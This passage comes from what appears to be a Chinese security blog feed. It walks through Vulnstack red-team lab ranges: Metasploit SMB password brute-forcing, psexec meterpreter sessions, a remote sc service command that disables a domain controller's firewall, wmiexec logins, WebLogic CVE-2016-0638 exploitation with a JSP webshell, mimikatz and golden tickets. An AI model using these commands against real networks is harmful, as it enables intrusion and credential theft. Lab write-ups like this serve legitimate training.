constant_">WIN2008</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:WIN2008</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">20</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">c:</span><span class="hljs-number">29</span><span class="hljs-symbol">:ab</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span><span class="hljs-symbol">:ec</span>)<br>[*] <span class="hljs-title class_">Scanned</span>  <span class="hljs-number">26</span> of <span class="hljs-number">256</span> hosts (<span class="hljs-number">10</span>% complete)<br>[+] <span class="hljs-title class_">Discovered</span> <span class="hljs-title class_">Net</span>BIOS on <span class="hljs-number">192.168</span>.<span class="hljs-number">93.30</span><span class="hljs-symbol">:</span><span class="hljs-number">137</span> (<span class="hljs-variable constant_">WIN7</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">20</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:WIN7</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">00</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1e&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:TEST</span><span class="hljs-symbol">:&lt;</span>1d&gt;<span class="hljs-symbol">:U</span> <span class="hljs-symbol">:__MSBROWSE__</span><span class="hljs-symbol">:&lt;</span><span class="hljs-number">01</span>&gt;<span class="hljs-symbol">:G</span> <span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>0<span class="hljs-symbol">c:</span><span class="hljs-number">29</span><span class="hljs-symbol">:e0</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span>2b)<br></code></pre></td></tr></table></figure><p>存在3个主机，namp扫描</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> nmap -Pn -sT -sV <span class="hljs-number">192.168.93.10</span> <span class="hljs-number">192.168.93.20</span> <span class="hljs-number">192.168.93.30</span> -F<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241112210127279.png" alt="image-20241112210127279"></p><p>192.168.93.10开放53端口，域控主机</p><p>利用msf模块进行进行SMB爆破PC主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/smb/smb_login<br><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.30</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">PASS_FILE</span> /home/<span class="hljs-comment">a</span>/桌面/<span class="hljs-comment">fuzzDicts</span>/passwordDict/<span class="hljs-comment">top500.txt</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBUser administrator</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173159551.png" alt="image-20241113173159551"></p><p>爆破win 2008主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.20</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173315508.png" alt="image-20241113173315508"></p><p>爆破win 2012主机密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.10</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173405019.png" alt="image-20241113173405019"></p><p>得到其中一个shell,也可得到密码</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113182254811.png" alt="image-20241113182254811"></p><h2 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h2><p>使用msf自带模块进行攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass 123qwe!ASD<br><span class="hljs-built_in">set</span> RHOSTS 192.168.93.30<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113173658813.png" alt="image-20241113173658813"></p><h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.20</span><br>exploit<br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113174904275.png" alt="image-20241113174904275"></p><h2 id="win2012（域控）"><a href="#win2012（域控）" class="headerlink" title="win2012（域控）"></a>win2012（域控）</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.93.10</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBPass zxcASDqw123!!</span><br>exploit<br></code></pre></td></tr></table></figure><p>有防火墙，失败</p><p>连接到win2008,迁移到域用户程序，成功访问域控</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113201645602.png" alt="image-20241113201645602"></p><p>关闭防火墙</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> create unablefirewall <span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">93</span>.<span class="hljs-number">10</span> start unablefirewall<br></code></pre></td></tr></table></figure><p>再执行，成功getshell</p><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113201907790.png" alt="image-20241113201907790"></p><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>或者使用另外一种方法</p><p>使用impacket包中的wmiexec工具，这里我用的0.9.24的文件，<a href="https://github.com/fortra/impacket/releases">Releases · fortra/impacket (github.com)</a>，最新0.12和0.9.19文件都不行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-string">&#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/11/07/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA3/image-20241113180756014.png" alt="image-20241113180756014"></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/340671.html">ATT&amp;CK红队评估（红日靶场三） - FreeBuf网络安全行业门户</a></p><p><a href="https://mp.weixin.qq.com/s/w7-PelJliBh6pvBtYBEHzQ">记一次靶场内网渗透（四） (qq.com)</a></p><p><a href="https://www.freebuf.com/articles/web/289947.html">ATK&amp;CK红队评估实战靶场（三） - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT—CK红队评估实战内网靶场2</title>
    <link href="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/"/>
    <url>/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶机通用密码： 1qaz@WSX</p><p>管理员账号密码：Administrator/1qaz@WSX</p><p>WEB：10.10.10.80     192.168.111.80</p><p>PC：10.10.10.201</p><p>DC：10.10.10.10</p><p>web登录de1ay/1qaz@WSX，启动C:\Oracle\Middleware\user_projects\domains\base_domain\bin\startWebLogic，需要使用管理员权限</p><p>WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务，启动Server、Workstation、Computer Browser ，我操作时，前面两个已启动，只需启动Computer Browser</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105174352874.png" alt="image-20241105174352874"></p><p>出现ip无法识别，最后指定网卡后解决</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105181525833.png" alt="image-20241105181525833"></p><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>nmap使用syn包扫描</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105203232218.png" alt="image-20241105203232218"></p><p>不带参数好像也行</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105037282.png" alt="image-20241106105037282"></p><p>发现存在7001端口，说明存在weblogic服务，工具检查</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105200057115.png" alt="image-20241105200057115"></p><p>存在cve-2016-0638,漏洞利用</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105202821134.png" alt="image-20241105202821134"></p><p>上传jsp马</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105202842125.png" alt="image-20241105202842125"></p><p>蚁剑连接</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106104554113.png" alt="image-20241106104554113"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现内网10.10.10.1/24，同时找到DC和PC的IP</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105441538.png" alt="image-20241106105441538"></p><p>关闭防火墙 netsh advfirewall set allprofiles state off</p><p> 查看域 net view /domain</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106161129450.png" alt="image-20241106161129450"></p><p>连上cs后提权，运行minikatz</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241105222131247.png" alt="image-20241105222131247"></p><p>postscan扫描内网</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106105147360.png" alt="image-20241106105147360"></p><p>均存在445端口，设置smb监听，psexec 内网横向移动</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241106155837159.png" alt="image-20241106155837159"></p><h1 id="域控权限维持"><a href="#域控权限维持" class="headerlink" title="域控权限维持"></a>域控权限维持</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>要求：域名称、域SID、krbtgt账户NTLM密码哈希、伪造用户名</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107143825055.png" alt="image-20241107143825055"></p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107143527270.png" alt="image-20241107143527270"></p><p>右键-&gt;Access-&gt;Golden Ticket</p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107144141579.png" alt="image-20241107144141579"></p><p><img src="/2024/11/05/ATT%E2%80%94CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA2/image-20241107144113696.png" alt="image-20241107144113696"></p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/x6-i7LF_Zy0gPSnutaNmpg">ATT&amp;CK实战系列-红队评估 （二）Vulnstack靶场内网域渗透 (qq.com)</a></p><p><a href="https://www.cnblogs.com/yokan/p/14189154.html">【红日安全-VulnStack】ATT&amp;CK实战系列——红队实战(二) - yokan - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>不死马心得</title>
    <link href="/2024/09/14/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%BF%83%E5%BE%97/"/>
    <url>/2024/09/14/%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b10333045d04dd3c4b19f2bf80a14ec58347e710d394d6fb4c111482c2c5cce0">a9f4eabeed29b4975bea77d08ef5ac120b5dc3415ddaf6bd398f9d0bd45bf099f8864686d0b2f0d7f6923e197484f4f18d635346cceebde2db57d1255464c1f936127447b0f20f0ae37b98a2923d22590a60353e0a58744ff6b732c0bbe494384219b74cdad41c79685ad1f39ed75a1fb184dda3e8f11a59df3f3ead6d8c41efee1152c3abef13f830b946665c93fdf011947fbb521868c8e099e1894744deec0ec20c9820d846cc8c11e1bf883ca70dd9055249e72fc852eaa74a6d0bea6b8b35e6bf8c95aeefda67ca581b775538d4f51c2b01b6258c8c6a43fb491550503f62f9aeeefd40445f88a6723e71161e7732f0e253c7a84d4929f5cfc5faa1819ef96ea0d155f836dc92564dc09992271d7b04a059776af9ad102b1ecea67f1b3f22004af5f32d5bfc7af6517685349c6050e02586161424a4688a466a9d853dea260829736d2cb1cbc969dcc814fed085467f28d128fc58a0b20ecbe80dce5c8e1ea06bae0dc0e140c36d9c304680c28d5759725729575833412fd16ac792588b9f2620548603772ebbcca787baf44639b0ce5caf77cf13c29f255c640e82ee18bf4930a19e53e9af0c86e52849ee15160cdec7bb87e0cd84d230a82ecb41a77beb854c1d4fef4513a44c380bc62f2ff9ab31140269b752b037924335356c5de3748a4daf1e3c676d8430049e9f2eaad293488e6b4f5e70fe613a370cf8e4c1277038b67dae6ff35010061d2086dc46b666cb0c53b4bf3ba494ee181a601cf1e8f3eb0fbb2004dfb46440b417d837200e13d44d5e4c8688c89bd901934d88b975e306916673461a8ce63dfae76173cfd8e340079c695abbbded9dc6b22537929f1319794b052b1f84314ec32d9429ae598a61567bf593b6d33f6fea997f3fc550a8a3b2bb64f8016d9741bb271e8c41ffb8bf8c11b6eb878dca8b690f0a04ee45fa1de1506063de472384a4b51b8e6550ef40117081f1e873a3fc671ae2dad526f171a610715a0ac4e773bb7804b9cbf5a221d5008f8730b942eb650f188590e11b12dfcc62334a98166f86ca0d05d34cdcc57ee786fd22c4ec7fd7e512cd3f8b51fdf19d00712491eef705099c78d4d74c7caf1326a59425d1ebc3a5ba3a4f6733bf2eec72dcb2214bb47053d9991cd30b3b968ba9832e5c3424f2c2d77bb8dc18a7a0e0f578de171b45b6aca42ba532127fb235137da7ec568add4e22ad70c6b91557301503fe95244960d130d363dc266636333cb1b69bf1514e2044496aef08f6e4563c722308c7d970e7125bcaabbe8b5d8aacbe3355e01e9938fdc988ded044fd5c982d51e6126b549dc331dc06fc5b339684d9d5e9dc1903fc0ba1c727a1b840200baa169029969dd5dd65b36a292753a1bd5d3e767e52c4da57240f36bd68fbe767d94e19715d175aabc4c6b4c3a111adebb0a4f28159200015186b0123a5c6676349365438f54bbe3f6f61ca9a844fd27b51fbbaa5cf4ae2a923279cadcad583003ff44b2a59220d69898137ac14f9628d6df6b0162271576cc068e1a879588c74d4e488f44fe981e783332ed9ed31f83c6dd718edb5dbc2a02464dcb3b8e5e9428afc9a7cf9a28e1d94833621e57cd4f1942235fddc174c44b4b9f1547f2b6a75862553fa32f33315a2d71d7c3c66531d53c54416848dea5cdaa7c6f1fb8db9c8a7146b6ac44807e7ed3eaf40bcfdc9d20e092897bec173ca107e426507769ec53a4d1a3d6c332094e07f4f1ad5a01e04c3a26ef6e782b95a8992f4e19d357a7c7457bd17e5cd8b2b8c7ffc66a9c2eb17d8c58a890692c93cdca45d59edb6dfa808280ad620726e618a5f08f117152385507e0ccdcb13c656f5000467598e6704a03515b940c09eeb450403f450f810bd40c5857e197d356161db11192c5e3fb91e8671a02f39a6099f6de380fbeffc2a8963ee9a582707ab454a11cad1276245c16c15d04a9f528400f1853f03edae7be0bf3cc9999bcb632e0c26d420e9c2ed99f590b0d79a7be1b048383da7e78805025e4c8af7dc0ee538c22817b13258c922c0499859a025e432efefc50f839daf4a15a05ffaaaf1139cc87a55e0eaf1364ea513c90df3a5c70db216a1b32ea5f3031aac2a822bf6012e95d66841755541d3069f76d2919cf3a274ce4874c6b163077eb97f1ad4311bd837623b68c924c306a748c3b8f2ada5b4c922d77278c20fe5817fe22e19993ed163f8b5e75801c65ddb23860ba54a95ee3990cbf0177f8de965fb858c5c7933789decd8445aec6d9cb75031ff119fa6823061d2de50619ad753d8c6734706d8dce51c794c5ada7dd2eeed8703ac4b929a4d08690952e0366be6b29ffc20dde56f67a3b8d1131873ffbcafefac48062f8cf08d08e7b71c37d03922227f61195fcfc8c2b2754070b8fa0e54323a6dfa1bfe61113223897bf52d19ed58b4d4f0a3d9ece8b996604ea53187fa1f4642e4c1c9a36851d8718b1d14c160d4d6c4147a2b649aaf61158726bd263dc78060d5a062ef16e53d730ff7700d036ca82b69956c516918c6bc1f28a55febbed661e1809d9a684ecba089703c77de8e5b7c90ea720ef1de6428971e0df4e79417571b3eed6fb1654964b922b7f3fe9dd73045d8db960ebf4a97ed33f541f83f75cdbb21718dbf2275be87b0716a277bf754cb03a2cdc845a91662949321ae045c6d60504d0a1f56530a72857202aaa591d12a830c908698c25de91a52943460fc41ee45ccf4ae937db057aaa64f9d1eab53f973ae2009da54054c168f7a9cd46f57b10ac314cadcfaabe95f90e67c654b827aea08da10583f4ac75baff554f0c9e94819878052a4cabe1b77cc1622d778fbd8b4295694413c86b20bc5c9006e9cc4e61586a8adf74fa74a291c357218bcaa3b6a50de2fd65d27ac4c9a8c37a33f2aede9a748b26f52093c34da69d7026c26ececa8284f15887df2680de329406ee031de3dbcb0af02ed55ab2f658ac63e847e76ca0650473454cbb23b4c21a344ada4e1eee388d322791cc1a2c5cd6e4ea757f113208d6f3635039ff83e7918781458e85fa81c9feaf273ed8ffacfed1d918a36c130c69421bd698d4ce2b89cd2ef031c2f33464c51038f544169ad29aa32ab95509170bcc11898c9779262364b4beb7d116ef5514b86c9413c8f983052046ce9944a32b5906d8733e65943bc11bc642341181dd03727f46f0db90eda083149b3748a588812cd107139c96490e3bca81367f3cd2e2de8db11b97fd87de62e483e212a5190e48b7a07969ad3dcec9f46ef6ccd7be9f10f6418e4396868219cf9c9d329fdda1ee43849e7764a6253d5b5d56e6b216b49980ae50618c0899da9f0e3c8e7b82ff298e0faf0192492fb23f40ccc0fdef2b86581737db67fdbf9e61307cc9cffe69b28216c6dc57ca67b4436e0ec751ce324916b39810f01ec57e47e20a8462673cf4431ed88a06c1377f0eb529c7161793fcc487aee96657173b9ff1d43bf3161cf8ecef6cb4df309f8f8ec81ed037f3c7d51724b2aed3de7ca3780954c85a9e5ed28b7c1878ddf12a7ca4bd1f3b891b30cf7fe4ee77ff43cdb264407d6b50bbf857088051f70ece551d8d15595709ea2b5341713fe3c9e16a67ccc0c6b6ac4cb7f20712917b06650646e8c3fb91b1ccfa3fffea7ee75dbdf763f9836f73f808076820e1b53c1252f8ef00709d4df09c90a8f6392cccd2975fe92173928e7b224eeb639647b08d677d7e3e266b5bfd636a63742858a57b51466bb8672838f1b96420488250264f7b2b0112b5c800625aac946d2600c89e70de6cb14afbac597dd0a3bf6f69fdb54573fe337438361ef0d7160077b378ca3a1d0f61e1bdeb9dca36da4f0f70f828e03e14bfca0e7f70a07bfe035ff6ea23cd943bb7ff2eb99cad9aad548376f0369d3fb6f761b53905d9de28f8c2d8f8099413a9203bdf1d55551ee5901f2a51f589e1d4a0140068aea35cad5c5c0fc8bbcc83f5da589510073c350e33fef8fcdc82577c778af435c250723aa7b9174213f2abee125039b6bbf4c1611c31675cd2627b62480ac63ae5772489ef50389ef871db202f754087b9a5d4c4190bb3f6634046fd6de413fd3497f9ee416853804e8a7df9eeaf341f93a4e049a0c83207d643b31823bb9e92b29f50631a41b3a9a6b56b374e51e6ca27cd25929355122923fe2fd1a73e44c1302735b66266fa6b2613b5c3d723a063f459f8c0732e4f65bcf5f406d93628649b8f92374871ea1bbe17feb4ea56a973fed91cf3d634ac9ac4b618e2a776dc38466fa683b553014d4ee49e1d5a9f993af3d3bee871ab77ad1154e7b7279a7220b1fb53265f5b5d0d46b7bb27f97aec1b20146e90599f232bd45d8e7aa592cb0211f0c7ab951b2ce38275e2b2575e40364f50f2c9a8e061c5aee9e1f1a4328a027373c70546e0ce0f68060d3e33ff0059f25a9c74556e0d5cbf28ee5628c96f88f9b343dd59cb213020bc6a32c4e2a7172c3dbd4fdcac2ad3c10eba5fe747f171558a46675dabd96093b04aadb3d85ff6b228b65d8c50dd2d005d425a04302cea4a4d75a19c5889c3da6fc10489376d2315eadfaa471417416048889544381cc5b026424f8519304fadcae4538fe847710955a1a117700268fd53e64d9367fac4e3d0dc1093e549adb1603239fa6e289bf3051b642ac8389f8f78d46a42dabcac766eea21e370081b38e6c943080fbee70ee8392809a63d67de51260260b496cffb7da739f52b23a5a18b15360cd9eea336f28edfc120146909be4b6c30562e917751e34778db49e2407358749747e4cea6a220ca96d9ac864624ec3a91f9116d5bc37fc8d35b527f9b9dd39b49c11529e74e6c03e71932a6a3fe2743bc700783b055a4e8e5a8c0edc71d04705b29495eb6bb77cbff5ff022a1341cc5eb4b32d4c9c998812ff8b3fc537d8f5504d3118ee09bd5787052f91b13b973c9b891b1293bb548d2bc444ae13c537d98e42f1e6c54fd0e38b74c4185301200a56c927ec5c51746d0bdc2dba0c24f4275d32337b21476efe4b9a63f74ba86a017c4b1d233287fcb5f29e4d074cf976e779672999cc9484c1ef09b99219fa9aace15ea019c7ccbdfb17f264208216282373bcec0880fd7591bebf715daafb113aee10bd616238cfe9bc8fd788fdd031103408462013a507673f2befcbd3550b11731652d53cfdc592e26f19754965d5d3714117ef4e0848cb6574450a92ce465a44fb95f2b43a0f1b74fad3f7aec4c2afa57dd404c158433777eceb3abdbf05ce86de913ccd9d19fa4c3387029b6629ae2a6af03a4d95ba506cf91e6198cc4fe841f5676e0ed732348997fe01aa8b6f1877fb024e6e07c83d708335ba5149647e04c6d32776834c08d525728fa90d4bac26934283bb71869ce4d7daa17eabd7e7747037699c09f78c05b0590657fa8ba983bcbe9d25c47e62ea7cbb64df77f9bea7f4281bdee72152f805bead8809c8207ca5de33d7befd5cc535931df33b729525bcaef82b57a00b1ae1212b3e1bf14cbc2c73e0ffada405651c10c48946cd32df0bf05fe1d0d70939fad17dad04cd2683aac04eb88db62024521c79628f227ee86cce906f041ed9f94317b1d7a16b0d7825bdd8e268ac7fcfaec86e4968f0e2be340972195fd7d3c23526cb9ef22e393f1bd52440714261f275ec610b48117bfde55aea22f6d1a3e128b23120d810fade441ea6280609763a741f3175b12f533b51851e11a9a430c2629b7c9ff1655f81a45bde103ff6220db82cc1c9179c2afc61132bbd39d1947e143dbdf9d54263cdafe2ef3540045e9eac5db22087443b9be69229f3f6ea89bbfabef82d326af31ea142c788e4f43084ed03fb16257c94dbdba3c80517247da702640dad03de43d68ecead124eec9304ffe2e9387fcc31ec3c11f25ada681d2c6ec6609fb765681a24786de9e680538fd6b922f962e944b6fe1856c4ffa71f064a49e86cf2c01f0def0229f7d6a216462ff709d9fd11901a09a1276a59986f8936770a94d70c16079aa00726ec75cfcb1679e3859f36bfceac8f728b44fbc875b3e328ffc43e413afd79deb7d2d66883aa99ccfd388d0be9af0c9153da716310afc039b28a8987d7d083cbb380ab36b33f6057444a78d0bf2ebbf47267ecfe57c8b9f3689cfa9525fa7f39204cdc656f0f533e0fb817a3a5920ce84367738acc3c28254922b2afc6069fb4baa8b7dd3c5ed94b95b8ab730c340c9b3f27c5d46e4bda3a9028e6d79cfa761b2e1c8a79b16f6450dd060c21b883e4f38070e88d0ad23c13b9d8b61bfab9553ddb68431dfa3d875f65f83926a33c4879a7552f4755c135ddea7f387ae8138228299abf4abf91001c08240c051bc456ff6184b022e6bad51d8c2e9d5d649a65b1210e3b58c01fc9ad6fa5dfdef3ff7b545d